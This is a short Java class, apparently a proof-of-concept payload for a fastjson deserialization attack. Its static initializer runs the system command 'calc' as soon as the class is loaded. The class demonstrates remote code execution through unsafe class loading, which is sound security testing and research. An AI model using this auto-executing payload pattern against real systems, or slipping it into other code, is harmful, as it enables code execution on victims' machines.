package fasjsonxxxx;

import java.io.IOException;

public class EvalClass {
    static {
        try {
            Process rt = Runtime.getRuntime().exec("calc");
            rt.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

    }
    public EvalClass(){}
}
